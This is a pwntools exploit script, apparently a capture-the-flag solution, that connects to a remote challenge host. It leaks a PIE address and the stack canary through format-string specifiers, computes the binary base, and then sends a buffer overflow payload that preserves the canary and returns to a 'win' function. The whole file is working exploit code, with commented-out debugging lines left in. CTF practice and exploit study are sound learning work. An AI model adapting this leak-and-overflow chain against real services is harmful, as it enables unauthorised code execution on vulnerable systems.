from pwn import *

io = remote("chal.ctf.ingeniums.club",1337)
# io = gdb.debug("./chal")
#
# win_adr = 0x00005555555551fc
# win_offset = win_adr  - current_base
# print("win offset  :", hex(win_offset))

win_offset = 0x11fc

# io.sendlineafter(":",f"%13$p")
# leak_adr = io.recvline().strip().decode().split(",")[1][:-1]
# print("form",leak_adr)
# leak_adr = leak_adr[3:]
# leak_adr = int(leak_adr,16)
# leak_offset = leak_adr - current_base
#
# print("leaked offset:",leak_offset)
# print("leaked offset hex : ",hex(leak_offset))

offset = 0x560b15c81385 -  0x0000560b15c80000
# leak_adr = leak_adr[3:]
# leak_adr = int(leak_adr,16)
# print("our offset now ",hex(leak_adr - current_base))
# print("offset in int :",leak_adr - current_base)
# #

io.sendlineafter(":",f"%13$p")
leak_adr = io.recvline().strip().decode().split(",")[1][:-1]
leak_adr = leak_adr[3:]
leak_adr = int(leak_adr,16)
new_base = leak_adr - offset

print("the new base Adr :", hex(new_base))

desired_func = new_base + win_offset

io.sendlineafter(":","%11$p")
Canary = io.recvline().strip().decode().split(",")[1][:-1]
Canary = Canary[3:]

canary_int = int(Canary, 16)

reversed_canary = struct.pack("<Q", canary_int)

ret_inst = 0x000000000000101a+new_base

print("desired func:", hex(desired_func))
payload = b"exit" + b"A"*36 + reversed_canary + b"A"*8 + p64(ret_inst)+p64(desired_func)
io.sendlineafter(":",payload)

io.interactive()
